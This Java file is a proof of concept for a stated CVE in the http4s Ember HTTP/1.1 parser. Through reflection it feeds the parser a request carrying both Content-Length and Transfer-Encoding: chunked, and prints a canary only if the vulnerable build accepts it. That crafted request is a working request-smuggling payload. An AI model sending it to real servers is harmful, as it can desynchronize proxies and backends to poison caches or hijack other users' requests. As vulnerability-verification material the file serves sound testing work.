import java.lang.reflect.*;

/**
 * PoC for CVE-2026-69204 — http4s Ember HTTP/1.1 request smuggling (CWE-444).
 *
 * The pre-patch Ember parser accepts a message carrying BOTH Content-Length and
 * Transfer-Encoding: chunked, which is exactly the header ambiguity that lets an
 * attacker desynchronize an intermediary from ember-server. The fix (0.23.35)
 * makes Parser.Request.parser raise ParseHeadersError(ContentLengthAndTransferEncoding)
 * for such a message.
 *
 * Differential primitive: feed the parser the exact conflicting message. On the
 * vulnerable build the parse SUCCEEDS and yields the (Request, Drain) tuple — the
 * smuggling primitive. On the patched build the run raises, so the canary is never
 * emitted. The canary is printed only as a consequence of the parser accepting the
 * ambiguous framing.
 */
public class Poc {
    public static void main(String[] a) {
        try {
            // Message with BOTH Content-Length and Transfer-Encoding: chunked.
            byte[] raw = ("POST / HTTP/1.1\r\n"
                    + "Content-Length: 0\r\n"
                    + "Transfer-Encoding: chunked\r\n"
                    + "\r\n"
                    + "0\r\n\r\n").getBytes(java.nio.charset.StandardCharsets.ISO_8859_1);

            // fs2.Chunk[Byte] = Chunk.array(raw)(ClassTag.Byte)
            Object ctMod = Class.forName("scala.reflect.ClassTag$").getField("MODULE$").get(null);
            Object ctByte = ctMod.getClass().getMethod("Byte").invoke(ctMod);
            Class<?> chunkCls = Class.forName("fs2.Chunk$");
            Object chunkMod = chunkCls.getField("MODULE$").get(null);
            Method arrayM = null;
            for (Method m : chunkCls.getMethods()) {
                if (m.getName().equals("array") && m.getParameterCount() == 2
                        && m.getParameterTypes()[1].getName().equals("scala.reflect.ClassTag")) {
                    arrayM = m;
                    break;
                }
            }
            final Object chunk = arrayM.invoke(chunkMod, raw, ctByte);

            // scala Some(chunk) / None
            final Object some = Class.forName("scala.Some").getConstructor(Object.class).newInstance(chunk);
            final Object none = Class.forName("scala.None$").getField("MODULE$").get(null);

            // Stateful read thunk: first evaluation -> Some(chunk), then None (EOF).
            final int[] idx = {0};
            Class<?> func0 = Class.forName("scala.Function0");
            Object thunk = Proxy.newProxyInstance(func0.getClassLoader(), new Class<?>[]{func0},
                    new InvocationHandler() {
                        public Object invoke(Object proxy, Method method, Object[] args) {
                            String n = method.getName();
                            if (n.startsWith("apply")) return (idx[0]++ == 0) ? some : none;
                            if (n.equals("toString")) return "read";
                            if (n.equals("hashCode")) return System.identityHashCode(proxy);
                            if (n.equals("equals")) return proxy == args[0];
                            return null;
                        }
                    });

            // cats.effect.IO instances + read = IO.delay(thunk)
            Class<?> ioCls = Class.forName("cats.effect.IO$");
            Object ioMod = ioCls.getField("MODULE$").get(null);
            Object async = ioCls.getMethod("asyncForIO").invoke(ioMod);
            Method delayM = null;
            for (Method m : ioCls.getMethods()) {
                if (m.getName().equals("delay") && m.getParameterCount() == 1) { delayM = m; break; }
            }
            Object read = delayM.invoke(ioMod, thunk);

            // Parser.Request.parser(maxHeaderSize)(head, read)(implicit F)
            Class<?> reqCls = Class.forName("org.http4s.ember.core.Parser$Request$");
            Object reqMod = reqCls.getField("MODULE$").get(null);
            Method parserM = null;
            for (Method m : reqCls.getMethods()) {
                if (m.getName().equals("parser")) { parserM = m; break; }
            }
            Class<?>[] pp = parserM.getParameterTypes();
            Object[] args = new Object[pp.length];
            boolean readAssigned = false;
            for (int i = 0; i < pp.length; i++) {
                Class<?> t = pp[i];
                if (t == int.class || t == Integer.class) args[i] = 4096;          // maxHeaderSize
                else if (t == byte[].class) args[i] = new byte[0];                 // head buffer
                else if (t == Object.class && !readAssigned) { args[i] = read; readAssigned = true; }
                else args[i] = async;                                              // implicits (Async serves all)
            }
            Object parseIO = parserM.invoke(reqMod, args);

            // Run synchronously. Patched build raises ParseHeadersError here.
            Object rtMod = Class.forName("cats.effect.unsafe.IORuntime$").getField("MODULE$").get(null);
            Object runtime = rtMod.getClass().getMethod("global").invoke(rtMod);
            Method runSync = null;
            for (Method m : parseIO.getClass().getMethods()) {
                if (m.getName().equals("unsafeRunSync") && m.getParameterCount() == 1) { runSync = m; break; }
            }
            Object result = runSync.invoke(parseIO, runtime);

            // Reached only when the parser ACCEPTED a message carrying both
            // Content-Length and Transfer-Encoding -> the smuggling primitive exists.
            if (result instanceof scala.Tuple2) {
                String canary = System.getenv("POC_CANARY");
                if (canary != null) System.out.println(canary);
            }
        } catch (Throwable t) {
            // Patched build rejects the ambiguous framing (or interop failed):
            // do not emit the canary.
        }
    }
}